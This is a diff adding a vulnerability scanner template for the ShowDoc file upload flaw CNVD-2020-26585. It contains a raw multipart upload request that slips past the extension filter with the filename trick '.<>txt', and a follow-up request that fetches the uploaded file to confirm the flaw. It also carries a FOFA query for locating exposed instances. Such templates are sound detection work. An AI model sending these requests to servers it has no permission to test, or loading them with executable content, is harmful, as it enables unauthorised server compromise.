@@ -1,0 +1,66 @@
+id: CNVD-2020-26585
+
+info:
+  name: Showdoc <2.8.6 - File Uploads
+  author: pikpikcu,Co5mos
+  severity: critical
+  description: |
+    ShowDoc is an online API and technical documentation tool that is very suitable for IT teams. Showdoc has a file upload vulnerability, which attackers can exploit to gain server permissions.
+  reference:
+    - https://vul.wangan.com/a/CNVD-2020-26585
+    - https://blog.csdn.net/qq_48985780/article/details/122211136
+    - https://github.com/star7th/showdoc/pull/1059
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L
+    cvss-score: 9.9
+    cwe-id: CWE-434
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="ShowDoc"
+  tags: cnvd,cnvd2020,showdoc,fileupload,intrusive
+variables:
+  str1: "{{randstr}}"
+
+http:
+  - raw:
+      - |
+        POST /index.php?s=/home/page/uploadImg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
+
+        ----------------------------835846770881083140190633
+        Content-Disposition: form-data; name="editormd-image-file"; filename="{{randstr}}.<>txt"
+        Content-Type: text/plain
+
+        {{str1}}
+        ----------------------------835846770881083140190633--
+      - |
+        GET /Public//Uploads//{{date}}//{{file}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 200
+          - body_2 == str1
+        condition: and
+
+    extractors:
+      - type: regex
+        name: date
+        part: body
+        group: 1
+        regex:
+          - '(\d{4}-\d{2}-\d{2})\\/([a-f0-9]+\.txt)'
+        internal: true
+
+      - type: regex
+        name: file
+        part: body
+        group: 2
+        regex:
+          - '(\d{4}-\d{2}-\d{2})\\/([a-f0-9]+\.txt)'
+        internal: true
+
+# digest: 4a0a00473045022062cd2c2372723a192107237f88061ef28ac914b37b54a0221127375e1ffce96c0221009f238b324e1dc2027171daa5c91398f44270177f799e5bef425529f795d8f979:922c64590222798bb761d5b6d8e72950
